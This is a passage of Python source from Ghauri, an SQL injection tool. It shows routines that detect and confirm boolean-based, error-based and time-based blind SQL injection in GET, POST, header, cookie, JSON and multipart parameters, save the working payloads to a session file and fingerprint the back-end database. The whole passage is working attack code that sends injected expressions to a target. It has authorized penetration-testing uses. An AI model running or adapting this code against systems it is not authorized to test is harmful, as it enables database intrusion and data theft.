                    f"confirming if {injection_type} parameter '{param_name}' is '{title}' vulnerable.."
                )
                random_boolean = random.randint(1234, 9999)
                random_boolean01 = random_boolean - 68
                expression = vector.replace(
                    "[INFERENCE]",
                    "{:05}={:05}".format(random_boolean, random_boolean),
                )
                expression01 = vector.replace(
                    "[INFERENCE]",
                    "{:05}={:05}".format(random_boolean, random_boolean01),
                )
                try:
                    attack = inject_expression(
                        url=url,
                        data=data,
                        proxy=proxy,
                        delay=delay,
                        timesec=timesec,
                        timeout=timeout,
                        headers=headers,
                        parameter=parameter,
                        expression=expression,
                        is_multipart=is_multipart,
                        injection_type=injection_type,
                    )
                    attack01 = inject_expression(
                        url=url,
                        data=data,
                        proxy=proxy,
                        delay=delay,
                        timesec=timesec,
                        timeout=timeout,
                        headers=headers,
                        parameter=parameter,
                        expression=expression01,
                        is_multipart=is_multipart,
                        injection_type=injection_type,
                    )
                    attack_false = attack01
                    retval, case, match_string = check_boolean_responses(
                        base,
                        attack,
                        attack01,
                        code=code,
                        match_string=match_string,
                        not_match_string=not_match_string,
                        text_only=text_only,
                    )
                    if retval:
                        vulnerable = True
                        is_boolean_vuln = True
                        logger.debug(
                            f"{injection_type} parameter '{param_name}' is '{title}' vulnerable."
                        )
                    else:
                        logger.debug(
                            f"{injection_type} parameter '{param_name}' is '{title}' not vulnerable."
                        )
                except Exception as e:
                    logger.critical(f"error {e}, during injection confirmation..")
            if payload_type == "error-based":
                vectors.update({"error_vector": vector})
                logger.debug(
                    f"confirming if {injection_type} parameter '{param_name}' is '{title}' vulnerable.."
                )
                string = "r0oth3x49"
                regex = r"(?is)(?:r0oth3x49)"
                if backend == "Microsoft SQL Server":
                    if "string error-based" in title:
                        to_str = is_string = True
                    if is_string:
                        string = "r0ot"
                        regex = r"(?is)(?:r0ot)"
                    else:
                        to_char = not is_string
                expression = vector.replace(
                    "[INFERENCE]",
                    to_dbms_encoding(
                        string, backend=backend, to_str=to_str, to_char=to_char
                    ),
                )
                try:
                    attack = inject_expression(
                        url=url,
                        data=data,
                        proxy=proxy,
                        delay=delay,
                        timesec=timesec,
                        timeout=timeout,
                        headers=headers,
                        parameter=parameter,
                        expression=expression,
                        is_multipart=is_multipart,
                        injection_type=injection_type,
                    )
                    mobj = re.search(regex, attack.text)
                    if mobj:
                        vulnerable = True
                        is_error_vuln = True
                        logger.debug(
                            f"{injection_type} parameter '{param_name}' is '{title}' vulnerable."
                        )
                    else:
                        logger.debug(
                            f"{injection_type} parameter '{param_name}' is '{title}' not vulnerable."
                        )
                except Exception as e:
                    logger.critical(f"error {e}, during injection confirmation..")
            if payload_type == "time-based blind":
                vectors.update({"time_vector": vector})
                if not is_boolean_vuln and not is_error_vuln:
                    logger.debug(
                        f"confirming if {injection_type} parameter '{param_name}' is '{title}' vulnerable.."
                    )
                    sleep_time = random.randint(5, 8)
                    expression = vector.replace("[INFERENCE]", "1=1").replace(
                        "[SLEEPTIME]", f"{sleep_time}"
                    )
                    try:
                        attack = inject_expression(
                            url=url,
                            data=data,
                            proxy=proxy,
                            delay=delay,
                            timesec=timesec,
                            timeout=timeout,
                            headers=headers,
                            parameter=parameter,
                            expression=expression,
                            is_multipart=is_multipart,
                            injection_type=injection_type,
                        )
                        response_time = attack.response_time
                        if response_time >= sleep_time:
                            vulnerable = True
                            logger.debug(
                                f"{injection_type} parameter '{param_name}' is '{title}' vulnerable."
                            )
                        else:
                            logger.debug(
                                f"{injection_type} parameter '{param_name}' is '{title}' not vulnerable."
                            )
                    except Exception as e:
                        logger.critical(f"error {e}, during injection confirmation..")
            if injection_type == "POST":
                _data = prepare_attack_request(
                    text=data,
                    payload=payload,
                    param=parameter,
                    is_multipart=is_multipart,
                    injection_type=injection_type,
                    encode=True,
                )
            if injection_type == "GET":
                _url = prepare_attack_request(
                    text=url,
                    payload=payload,
                    param=parameter,
                    injection_type=injection_type,
                    encode=True,
                )
            if injection_type == "GET":
                _payload = urldecode(payload)
                if backend == "Microsoft SQL Server":
                    _payload = _payload.replace("%2b", "+")
                payload = f"{param_name}={param_value}{_payload}"
            elif injection_type == "POST":
                if is_multipart:
                    payload = _data.encode("unicode_escape").decode("utf-8")
                else:
                    payload = urldecode(_data)
                if backend == "Microsoft SQL Server":
                    payload = payload.replace("%2b", "+")
            elif injection_type == "HEADER":
                _payload = urldecode(payload)
                payload = f"{param_name}: {param_value}{_payload}"
                if backend == "Microsoft SQL Server":
                    payload = payload.replace("%2b", "+")
            elif injection_type == "COOKIE":
                _payload = urldecode(payload)
                payload = f"{param_name}={param_value}{_payload}"
                if backend == "Microsoft SQL Server":
                    payload = payload.replace("%2b", "+")
            _msg = TEMPLATE_INJECTED_MESSAGE.format(
                PAYLOAD_TYPE=payload_type,
                TITLE=title,
                PAYLOAD=payload,
            )
            __.append(_msg)
        message += "\n".join(__)
        message += "\n---"
        if not vulnerable:
            if is_multipart:
                param_name = f"MULTIPART {param_name}"
            if is_json:
                param_name = f"JSON {param_name}"
            logger.critical(
                f"it seems the parameter '{nc}{param_name}{mc}' is not vulnerable, please rerun the program with --flush-session switch.."
            )
            logger.end("ending")
            exit(0)
        logger.success(message)
        _temp = Response(
            vulnerable=vulnerable,
            attack01=attack_false,
            match_string=match_string,
            vectors=vectors,
            injection_type=__injecton_type,
            param=param,
            backend=backend,
            is_string=is_string,
        )
        boolean_vector = vectors.get("boolean_vector")
        error_based_in_vectors = bool("error_vector" in vectors)
        if boolean_vector and not error_based_in_vectors:
            attack = attack_false
            match_string = match_string
            backend = extended_dbms_check(
                base,
                parameter,
                url=url,
                data=data,
                headers=headers,
                injection_type=injection_type,
                proxy=proxy,
                is_multipart=is_multipart,
                timeout=timeout,
                delay=delay,
                timesec=timesec,
                vector=boolean_vector,
                backend=backend,
                attack=attack,
                code=code,
                match_string=match_string,
                not_match_string=not_match_string,
                text_only=text_only,
            )
        else:
            logger.info(f"testing {backend}")
            logger.info(f"confirming {backend}")
            logger.notice(f"the back-end DBMS is {backend}")
        return _temp
    return None


def check_injections(
    base,
    parameter,
    url="",
    data="",
    proxy="",
    headers="",
    injection_type="",
    batch=False,
    is_multipart=False,
    timeout=30,
    delay=0,
    timesec=5,
    dbms=None,
    techniques="BTE",
    possible_dbms=None,
    session_filepath=None,
    force_dbms=None,
    is_json=False,
    retries=3,
    prefix=None,
    suffix=None,
    code=None,
    string=None,
    not_string=None,
    text_only=False,
):
    sqlis = []
    is_injected = False
    is_vulnerable = False
    is_boolean_confirmed = False
    number_of_requests_performed = 4
    priorities = {}
    vectors = {}
    param_name = ""
    attack01 = None
    tsqli = None
    bsqli = None
    esqli = None
    is_injected_error = False
    is_injected_bool = False
    is_injected_time = False
    is_string = False
    Ghauri = collections.namedtuple(
        "Ghauri",
        [
            "url",
            "data",
            "vectors",
            "backend",
            "parameter",
            "headers",
            "base",
            "injection_type",
            "vulnerable",
            "is_multipart",
            "boolean_false_attack",
            "match_string",
            "is_string",
        ],
    )
    retval_session = check_session(
        url=url,
        data=data,
        base=base,
        proxy=proxy,
        delay=delay,
        timesec=timesec,
        timeout=timeout,
        headers=headers,
        parameter=parameter,
        is_multipart=is_multipart,
        injection_type=injection_type,
        session_filepath=session_filepath,
        is_json=is_json,
        code=code,
        match_string=string,
        not_match_string=not_string,
        text_only=text_only,
    )
    if retval_session and retval_session.vulnerable:
        return Ghauri(
            url=url,
            data=data,
            vectors=retval_session.vectors,
            backend=retval_session.backend,
            parameter=retval_session.param,
            headers=headers,
            base=base,
            injection_type=retval_session.injection_type,
            vulnerable=True,
            is_multipart=is_multipart,
            boolean_false_attack=retval_session.attack01,
            match_string=retval_session.match_string,
            is_string=retval_session.is_string,
        )
    param_name += parameter.get("key")
    param_value = parameter.get("value")
    if "E" in techniques and possible_dbms:
        esqli = check_errorbased_sqli(
            base,
            parameter,
            url=url,
            data=data,
            headers=headers,
            injection_type=injection_type,
            proxy=proxy,
            batch=batch,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            dbms=possible_dbms,
            prefix=prefix,
            suffix=suffix,
            is_json=is_json,
            retry=retries,
            possible_dbms=possible_dbms,
        )
        if esqli:
            is_injected_error = True
            is_string = esqli.is_string
            priorities.update({"error-based": esqli})
            vectors.update({"error_vector": esqli.prepared_vector})
            prefix = esqli.prefix if not prefix else prefix
            suffix = esqli.suffix if not suffix else suffix
            number_of_requests_performed += esqli.number_of_requests
            sqlis.append(esqli)
    if "B" in techniques:
        bsqli = check_booleanbased_sqli(
            base,
            parameter,
            url=url,
            data=data,
            headers=headers,
            injection_type=injection_type,
            proxy=proxy,
            batch=batch,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            possible_dbms=possible_dbms,
            prefix=prefix,
            suffix=suffix,
            is_json=is_json,
            retry=retries,
            code=code,
            match_string=string,
            not_match_string=not_string,
            text_only=text_only,
        )
        is_injected_bool = bool(bsqli and bsqli.injected)
        if is_injected_bool:
            sqlis.append(bsqli)
            priorities.update({"boolean-based": bsqli})
            vectors.update({"boolean_vector": bsqli.prepared_vector})
            prefix = bsqli.prefix if not prefix else prefix
            suffix = bsqli.suffix if not suffix else suffix
            dbms = bsqli.backend if not dbms else dbms
            if number_of_requests_performed == 4:
                number_of_requests_performed += bsqli.number_of_requests
    if "T" in techniques:
        if not dbms and possible_dbms:
            dbms = possible_dbms
        tsqli = check_timebased_sqli(
            base,
            parameter,
            url=url,
            data=data,
            headers=headers,
            injection_type=injection_type,
            proxy=proxy,
            batch=batch,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            dbms=dbms,
            prefix=prefix,
            suffix=suffix,
            is_json=is_json,
            retry=retries,
        )
        is_injected_time = bool(tsqli and tsqli.injected)
        if is_injected_time:
            sqlis.append(tsqli)
            priorities.update({"time-based": tsqli})
            vectors.update({"time_vector": tsqli.prepared_vector})
            dbms = tsqli.backend if not dbms else dbms
            if number_of_requests_performed == 4:
                number_of_requests_performed += tsqli.number_of_requests
    if "E" in techniques and not possible_dbms:
        esqli = check_errorbased_sqli(
            base,
            parameter,
            url=url,
            data=data,
            headers=headers,
            injection_type=injection_type,
            proxy=proxy,
            batch=batch,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            dbms=dbms,
            prefix=prefix,
            suffix=suffix,
            is_json=is_json,
            retry=retries,
            possible_dbms=possible_dbms,
        )
        if esqli:
            is_injected_error = True
            is_string = esqli.is_string
            priorities.update({"error-based": esqli})
            vectors.update({"error_vector": esqli.prepared_vector})
            prefix = esqli.prefix if not prefix else prefix
            suffix = esqli.suffix if not suffix else suffix
            number_of_requests_performed += esqli.number_of_requests
            sqlis.append(esqli)
    is_injected = bool(is_injected_error or is_injected_bool or is_injected_time)
    is_vulnerable = is_injected_error
    if is_injected:
        priority_keys = list(priorities.keys())
        error_based_in_priority = bool("error-based" in priority_keys)
        if "error-based" not in priority_keys:
            if is_multipart:
                message = f"checking if the injection point on (custom) {injection_type} parameter 'MULTIPART {param_name}' is a false positive"
            elif is_json:
                message = f"checking if the injection point on (custom) {injection_type} parameter 'JSON {param_name}' is a false positive"
            else:
                message = f"checking if the injection point on {injection_type} parameter '{param_name}' is a false positive"
            logger.info(message)
        if "boolean-based" in priority_keys and not error_based_in_priority:
            retval = priorities.get("boolean-based")
            retval_boolean_based = confirm_booleanbased_sqli(
                base,
                parameter,
                retval.payload_raw,
                url=url,
                data=data,
                headers=headers,
                injection_type=injection_type,
                proxy=proxy,
                is_multipart=is_multipart,
                timeout=timeout,
                delay=delay,
                timesec=timesec,
                response_time=retval.response_time,
                match_string=retval.string if not string else string,
            )
            logger.debug(
                f"successfull tests performed {len(retval_boolean_based.tests_performed)}, vulnerable: {retval_boolean_based.vulnerable}"
            )
            is_vulnerable = retval_boolean_based.vulnerable
            is_boolean_confirmed = is_vulnerable
        if "time-based" in priority_keys and not error_based_in_priority:
            retval = priorities.get("time-based")
            retval_time_based = confirm_timebased_sqli(
                base,
                parameter,
                retval.payload_raw,
                retval.sleep_time,
                retval.response_time,
                url=url,
                data=data,
                headers=headers,
                injection_type=injection_type,
                proxy=proxy,
                with_status_code=retval.with_status_code,
                is_different_status_code_injectable=retval.is_different_status_code_injectable,
                is_multipart=is_multipart,
                timeout=timeout,
                delay=delay,
                timesec=timesec,
                is_boolean_confirmed=is_boolean_confirmed,
            )
            is_vulnerable = retval_time_based.vulnerable
        if is_vulnerable:
            if is_multipart:
                message = f"\n(custom) {injection_type} parameter 'MULTIPART {param_name}' is vulnerable. Do you want to keep testing the others (if any)? [y/N] "
            elif is_json:
                message = f"\n(custom) {injection_type} parameter 'JSON {param_name}' is vulnerable. Do you want to keep testing the others (if any)? [y/N] "
            else:
                message = f"\n{injection_type} parameter '{param_name}' is vulnerable. Do you want to keep testing the others (if any)? [y/N] "
            question = logger.read_input(message, batch=batch, user_input="N")
            if question == "n":
                message = "Ghauri identified the following injection point(s) with a total of {nor} HTTP(s) requests:\n".format(
                    nor=number_of_requests_performed
                )
                message += "---\n"
                # message += "Parameter: {} ({})".format(
                #     param_name, injection_type if param_name != "#1*" else "URI"
                # )
                _p = param_name
                _it = injection_type if param_name != "#1*" else "URI"
                if is_json:
                    _p = f"JSON {param_name}"
                    _it = f"(custom) {injection_type}"
                if is_multipart:
                    _p = f"MULTIPART {param_name}"
                    _it = f"(custom) {injection_type}"
                message += "Parameter: {} ({})".format(_p, _it)
                payload_lists = []
                backend = esqli.backend if error_based_in_priority else None
                attack01 = None
                match_string = None
                if dbms and not backend:
                    backend = dbms
                for entry in sqlis:
                    param_value = entry.param.get("value").replace("*", "")
                    injection_type = entry.injection_type
                    _payload = urldecode(entry.payload)
                    if entry.backend == "Microsoft SQL Server":
                        _payload = _payload.replace("%2b", "+")
                    session.dump(
                        session_filepath=session_filepath,
                        query=PAYLOAD_STATEMENT,
                        values=(
                            entry.title,
                            entry.number_of_requests,
                            entry.payload,
                            entry.prepared_vector,
                            entry.backend,
                            json.dumps(entry.param),
                            entry.injection_type,
                            entry.payload_type,
                            entry.path,
                        ),
                    )
                    if injection_type == "GET":
                        payload = f"{param_name}={param_value}{_payload}"
                    elif injection_type == "POST":
                        if is_multipart:
                            payload = entry.data.encode("unicode_escape").decode(
                                "utf-8"
                            )
                        else:
                            payload = urldecode(entry.data)
                        if entry.backend == "Microsoft SQL Server":
                            payload = payload.replace("%2b", "+")
                    elif injection_type == "HEADER":
                        payload = f"{param_name}: {param_value}{_payload}"
                    elif injection_type == "COOKIE":
                        payload = f"{param_name}={param_value}{_payload}"
                    _msg = TEMPLATE_INJECTED_MESSAGE.format(
                        PAYLOAD_TYPE=entry.payload_type,
                        TITLE=entry.title,
                        PAYLOAD=payload,
                    )
                    payload_lists.append(_msg)
                message += "\n".join(payload_lists)
                message += "\n---"
                logger.success(message)
                boolean = priorities.get("boolean-based")
                if boolean:
                    attack01 = boolean.attacks[-1]
                    match_string = boolean.string
                if boolean and "error-based" not in priority_keys:
                    attack = boolean.attacks[-1]
                    boolean_vector = boolean.prepared_vector
                    backend = extended_dbms_check(
                        base,
                        parameter,
                        url=url,
                        data=data,
                        headers=headers,
                        injection_type=injection_type,
                        proxy=proxy,
                        is_multipart=is_multipart,
                        timeout=timeout,
                        delay=delay,
                        timesec=timesec,
                        vector=boolean_vector,
                        backend=backend,
                        attack=attack,
                        code=code,
                        match_string=string,
                        not_match_string=not_string,
                        text_only=text_only,
                    )
                else:
                    logger.info(f"testing {backend}")
                    logger.info(f"confirming {backend}")
                    logger.notice(f"the back-end DBMS is {backend}")
                return Ghauri(
                    url=url,
                    data=data,
                    vectors=vectors,
                    backend=backend,
                    parameter=parameter,
                    headers=headers,
                    base=base,
                    injection_type=injection_type,
                    vulnerable=True,
                    is_multipart=is_multipart,
                    boolean_false_attack=attack01,
                    match_string=match_string,
                    is_string=is_string,
                )
        else:
            logger.warning("false positive or unexploitable injection point detected")
            if is_multipart:
                msg = f"(custom) {injection_type} parameter '{mc}MULTIPART {param_name}{nc}' does not seem to be injectable"
            if is_json:
                msg = f"(custom) {injection_type} parameter '{mc}JSON {param_name}{nc}' does not seem to be injectable"
            else:
                msg = f"{injection_type} parameter '{mc}{param_name}{nc}' does not seem to be injectable"
            logger.notice(msg)
    else:
        if is_multipart:
            msg = f"(custom) {injection_type} parameter '{mc}MULTIPART {param_name}{nc}' does not seem to be injectable"
        if is_json:
            msg = f"(custom) {injection_type} parameter '{mc}JSON {param_name}{nc}' does not seem to be injectable"
        else:
            msg = f"{injection_type} parameter '{mc}{param_name}{nc}' does not seem to be injectable"
        logger.notice(msg)
    return None
